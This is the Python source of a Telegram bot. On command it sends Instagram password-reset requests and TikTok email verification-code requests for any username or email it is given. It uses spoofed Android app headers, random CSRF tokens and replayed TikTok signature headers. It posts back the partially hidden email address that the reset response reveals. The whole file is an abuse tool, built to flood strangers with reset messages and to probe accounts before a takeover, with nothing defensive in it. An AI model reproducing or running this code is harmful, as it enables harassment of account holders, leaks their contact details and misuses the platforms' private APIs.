import os
import uuid
import string
import random
import requests
import telebot

# === CONFIGURATION ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
GROUP_CHAT_ID = int(os.getenv("GROUP_CHAT_ID"))
THREAD_ID = int(os.getenv("THREAD_ID"))
bot = telebot.TeleBot(BOT_TOKEN)

# === IG Reset Request Function ===
def send_reset_request(target):
    headers = {
     "user-agent": f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}; en_GB;)"
        }
 

    data = {
      "_csrftoken": "".join(random.choices(string.ascii_lowercase +
                                                          string.ascii_uppercase + string.digits, k=32)),
                    "_csrftoken": "".join(random.choices(string.ascii_lowercase +
                                                          string.ascii_uppercase + string.digits, k=32)),
                    "username": target,
                    "guid": uuid.uuid4(),
                    "device_id": uuid.uuid4()
    }

    if "@" in target:
        data["user_email"] = target
    else:
        data["username"] = target

    try:
        response = requests.post(
            "https://i.instagram.com/api/v1/accounts/send_password_reset/",
            headers=headers,
            data=data
        )
        json_data = response.json()

        if "obfuscated_email" in json_data:
            return f"✅ *Reset Sent!*\n🔒 `Email`: `{json_data['obfuscated_email']}`\n\n©️ by @og69x"
        elif "message" in json_data:
            return f"❌ *Failed*: {json_data['message']}"
        else:
            return f"⚠️ *Unexpected response*\n```{response.text}```"
    except Exception as e:
        return f"❌ *Error*: {str(e)}"



def tiktok(target):
    email = target

    url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/send_code/"

    params = {
        'passport-sdk-version': "19",
        'iid': "7372613882915211014",
        'device_id': "7372613015445308933",
        'ac': "wifi",
        'channel': "googleplay",
        'aid': "1233",
        'app_name': "musical_ly",
        'version_code': "310503",
        'version_name': "31.5.3",
        'device_platform': "android",
        'os': "android",
        'ab_version': "31.5.3",
        'ssmix': "a",
        'device_type': "ART-L29N",
        'device_brand': "HUAWEI",
        'language': "ar",
        'os_api': "29",
        'os_version': "10",
        'openudid': "47b07f1a42f3d962",
        'manifest_version_code': "2023105030",
        'resolution': "720*1491",
        'dpi': "320",
        'update_version_code': "2023105030",
        '_rticket': "1716570582691",
        'is_pad': "0",
        'app_type': "normal",
        'sys_region': "YE",
        'mcc_mnc': "42102",
        'timezone_name': "Asia/Aden",
        'carrier_region_v2': "421",
        'app_language': "ar",
        'carrier_region': "YE",
        'ac2': "wifi",
        'uoo': "1",
        'op_region': "YE",
        'timezone_offset': "10800",
        'build_number': "31.5.3",
        'host_abi': "arm64-v8a",
        'locale': "ar",
        'region': "YE",
        'ts': "1716570584",
        'cdid': "10f6e4d6-16f9-4a03-a021-4375a1c072c8",
        'support_webview': "1",
        'reg_store_region': "ye",
        'cronet_version': "2fdb62f9_2023-09-06",
        'ttnet_version': "4.2.152.11-tiktok",
        'use_store_region_cookie': "1"
    }

    payload = f"rules_version=v2&account_sdk_source=app&multi_login=1&type=31&email={email}&mix_mode=1"

    headers = {
        'User-Agent': "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 10; ar_YE; ART-L29N; Build/HUAWEIART-L29N; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)",
        'Content-Type': "application/x-www-form-urlencoded",
        'sdk-version': "2",
        'x-ss-req-ticket': "1716570582694",
        'x-tt-passport-csrf-token': "24a8c5234188c87c654cf17f2ee2dc70",
        'passport-sdk-version': "19",
        'x-tt-dm-status': "login=0;ct=1;rt=6",
        'x-tt-bypass-dp': "1",
        'x-vc-bdturing-sdk-version': "2.3.3.i18n",
        'x-ss-stub': "8CC81EE0FB32631749A8267BEB4F3249",
        'x-tt-trace-id': "00-ab947041106650c879cc0a06053304d1-ab947041106650c8-01",
        'x-argus': "43ezL+yAGAg/ntTuU/ujVA8I1E6tQEh2+Ay9fZ8xSJzIxShzJLdOIp1oZSMcTmTd79DKgYvYG3Y6EJHQw0hRl3ptm+MgzlmjKohIZsPGftz0AudftXdILG3SqIRh7R4+Kzs+vcYKR/dal+lnAhKgTRRfxYDDBVHNB7kpiQEOkH915AYJ1uF8qGO3uZTHfElq8kc94HsCZBDWv5ZZ6vOB3hPbgc/dLzjxLir837B5Jpe4OllaKgN3L5v3WC+2JJn/VTMk81UwfNSH8l7p7NnIbXJd6m59h9IFWgomPpqEpOhlu+ROhJuWmJ5FS3lZJrPBK0h3mlYhNJbKxRgIaeylVZkljvuFZ8fwPxvog2U6obOSEXQATIjZMhT+BoSTcvpdGn/P55O9J3IR/0hlDwzx3Sp3/xqsfp8l/QmArv4ha70TG1by0QDdvXAfBzs/JJZQ9qku/JAZnYfgXoPfrhQbdwjJf2Gmj8XphbcKIp/oEUzSOs5Fjc3pbRgfLVBPbTf/0yEVGlwv4VblaBxOsAaqJuRY",
        'x-gorgon': "84040039000073c5d5fa441990245151415451f12ba24072b6e4",
        'x-khronos': "1716570578",
        'x-ladon': "DOCmYT1SFgBtXIky8cBH+g/ymcAe+237nMdEAu2IPa2oUq7O",
    }


    session = requests.Session()


    try:
        response = session.post(url, params=params, data=payload, headers=headers)
        return f"📨 *TikTok Response*:\n```{response.text}```"
    except requests.exceptions.RequestException as e:
        return f"❌ *Request Error*: {e}"



# === LISTEN ONLY FOR /reset COMMAND IN THREAD ===
@bot.message_handler(commands=['reset'])
def handle_reset_command(message):
    if message.chat.id != GROUP_CHAT_ID or message.message_thread_id != THREAD_ID:
        return  # Ignore messages outside the target thread

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: `/reset username_or_email`", parse_mode="Markdown")
        return

    target = parts[1].strip()
    response_text = send_reset_request(target)
    bot.reply_to(message, response_text, parse_mode="Markdown")


# === LISTEN ONLY FOR /tiktok COMMAND IN THREAD ===

@bot.message_handler(commands=['tiktok'])
def handle_tiktok_command(message):
    if message.chat.id != GROUP_CHAT_ID or message.message_thread_id != THREAD_ID:
        return  # Ignore messages outside the target thread

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: `/tiktok username_or_email`", parse_mode="Markdown")
        return

    target = parts[1].strip()
    response_text = tiktok(target)
    bot.reply_to(message, response_text, parse_mode="Markdown")
# === START BOT ===
print("🤖 Bot is running...")
bot.infinity_polling()
